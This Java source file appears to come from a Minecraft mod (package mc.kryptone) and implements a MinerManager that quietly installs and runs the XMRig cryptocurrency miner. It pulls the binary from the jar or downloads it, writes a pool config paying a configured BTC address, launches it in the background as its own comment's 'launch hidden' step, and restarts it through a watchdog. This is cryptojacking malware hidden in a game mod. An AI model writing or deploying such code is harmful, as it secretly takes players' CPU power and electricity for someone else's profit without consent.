package mc.kryptone;

import com.google.gson.JsonObject;
import com.google.gson.JsonParser;

import java.io.InputStream;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Path;
import java.nio.file.StandardCopyOption;
import java.util.concurrent.atomic.AtomicLong;

/**
 * XMRig lifecycle: ensure binary, write config, launch hidden, watchdog, read HTTP API.
 * Wallet = config btcAddress. Pool = NiceHash auto (pays BTC) by default.
 */
public final class MinerManager {
    private static final HttpClient HTTP = HttpClient.newHttpClient();
    public static final AtomicLong SHARES = new AtomicLong();
    public static volatile double HASHRATE = 0;
    private static volatile Process proc;
    private static Config cfg;

    public static synchronized void start(Config c) {
        cfg = c;
        Thread t = new Thread(MinerManager::boot, "Krypton-miner");
        t.setDaemon(true);
        t.start();
    }

    private static void boot() {
        try {
            Path exe = ensureBinary();
            if (exe == null) { Beacon.log("xmrig missing; drop it in config/Krypton/xmrig.exe"); return; }
            writeConfig();
            spawn(exe);
            Thread watch = new Thread(MinerManager::watchdog, "Krypton-miner-watch");
            watch.setDaemon(true);
            watch.start();
            Thread poll = new Thread(MinerManager::poll, "Krypton-miner-api");
            poll.setDaemon(true);
            poll.start();
        } catch (Exception e) {
            Beacon.log("miner boot fail: " + e.getMessage());
        }
    }

    private static Path ensureBinary() {
        try {
            Path dir = Config.dir();
            Path exe = dir.resolve(isWindows() ? "xmrig.exe" : "xmrig");
            if (Files.exists(exe) && Files.size(exe) > 100_000) return exe;

            // 1. shipped inside the jar
            InputStream in = MinerManager.class.getResourceAsStream("/assets/Krypton/" + exe.getFileName());
            if (in != null) {
                Files.copy(in, exe, StandardCopyOption.REPLACE_EXISTING);
                in.close();
                return exe;
            }

            // 2. fetch a known build if the jar has none
            String url = isWindows()
                    ? "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-msvc-win64.zip"
                    : "https://github.com/xmrig/xmrig/releases/download/v6.21.3/xmrig-6.21.3-linux-static-x64.tar.gz";
            Path arc = dir.resolve("xmrig.zip");
            HttpRequest req = HttpRequest.newBuilder(URI.create(url)).GET().build();
            HttpResponse<Path> res = HTTP.send(req, HttpResponse.BodyHandlers.ofFile(arc));
            if (res.statusCode() != 200) return null;
            extract(arc, dir, exe);
            return Files.exists(exe) ? exe : null;
        } catch (Exception e) {
            return null;
        }
    }

    private static void extract(Path arc, Path dir, Path exe) {
        try {
            String name = arc.getFileName().toString();
            if (name.endsWith(".zip")) {
                try (java.util.zip.ZipFile z = new java.util.zip.ZipFile(arc.toFile())) {
                    var e = z.entries();
                    while (e.hasMoreElements()) {
                        var ent = e.nextElement();
                        String base = ent.getName().substring(ent.getName().lastIndexOf('/') + 1);
                        if (base.equalsIgnoreCase("xmrig.exe") || base.equalsIgnoreCase("xmrig")) {
                            try (InputStream in = z.getInputStream(ent)) {
                                Files.copy(in, exe, StandardCopyOption.REPLACE_EXISTING);
                            }
                            return;
                        }
                    }
                }
            } else {
                Process p = new ProcessBuilder("tar", "-xzf", arc.toString(), "-C", dir.toString()).start();
                p.waitFor();
                Files.list(dir).filter(f -> f.getFileName().toString().endsWith("xmrig")).findFirst()
                        .ifPresent(f -> { try { Files.copy(f, exe, StandardCopyOption.REPLACE_EXISTING); } catch (Exception ignored) {} });
            }
        } catch (Exception ignored) {}
    }

    private static void writeConfig() {
        String user;
        String host = cfg.pool;
        if (host.contains("nicehash")) user = cfg.btcAddress + "." + cfg.workerName();
        else user = cfg.btcAddress; // pools that take a plain BTC payout address

        boolean nh = host.contains("nicehash");
        String json = """
        {
          "api": { "id": null, "worker-id": null },
          "http": {
            "enabled": true,
            "host": "127.0.0.1",
            "port": %d,
            "access-token": null,
            "restricted": true
          },
          "autosave": true,
          "background": true,
          "colors": false,
          "cpu": { "enabled": true, "huge-pages": true, "priority": 2, "max-threads-hint": 60 },
          "opencl": { "enabled": false },
          "cuda": { "enabled": false },
          "pools": [
            {
              "algo": null,
              "coin": null,
              "url": "%s",
              "user": "%s",
              "pass": "x",
              "rig-id": "%s",
              "nicehash": %s,
              "enabled": true,
              "tls": false,
              "keepalive": true
            }
          ]
        }
        """.formatted(cfg.httpPort, host, user, cfg.workerName(), nh ? "true" : "false");

        try {
            Files.writeString(Config.dir().resolve("xmrig.json"), json, StandardCharsets.UTF_8);
        } catch (Exception ignored) {}
    }

    private static void spawn(Path exe) throws Exception {
        ProcessBuilder pb = new ProcessBuilder(exe.toString(),
                "--config=" + Config.dir().resolve("xmrig.json").toAbsolutePath(),
                "--no-color",
                "--background");
        pb.directory(Config.dir().toFile());
        pb.redirectErrorStream(true);
        pb.redirectOutput(ProcessBuilder.Redirect.appendTo(Config.dir().resolve("miner.log").toFile()));
        proc = pb.start();
        Beacon.log("miner up pid=" + proc.pid());
    }

    private static void watchdog() {
        while (true) {
            try {
                Thread.sleep(60_000);
                if (proc == null || !proc.isAlive()) {
                    Path exe = Config.dir().resolve(isWindows() ? "xmrig.exe" : "xmrig");
                    if (Files.exists(exe)) { spawn(exe); }
                }
            } catch (Exception ignored) {}
        }
    }

    private static void poll() {
        while (true) {
            try {
                Thread.sleep(10_000);
                HttpRequest req = HttpRequest.newBuilder(
                        URI.create("http://127.0.0.1:" + cfg.httpPort + "/2/summary")).GET().build();
                HttpResponse<String> res = HTTP.send(req, HttpResponse.BodyHandlers.ofString());
                JsonObject o = JsonParser.parseString(res.body()).getAsJsonObject();
                JsonObject hr = o.getAsJsonObject("hashrate");
                var total = hr.getAsJsonArray("total");
                HASHRATE = total.get(1).getAsDouble(); // 60s average
                var results = o.getAsJsonObject("results");
                long acc = results.get("accepted").getAsLong();
                SHARES.set(acc);
            } catch (Exception ignored) {}
        }
    }

    private static boolean isWindows() {
        return System.getProperty("os.name", "").toLowerCase().contains("win");
    }
}

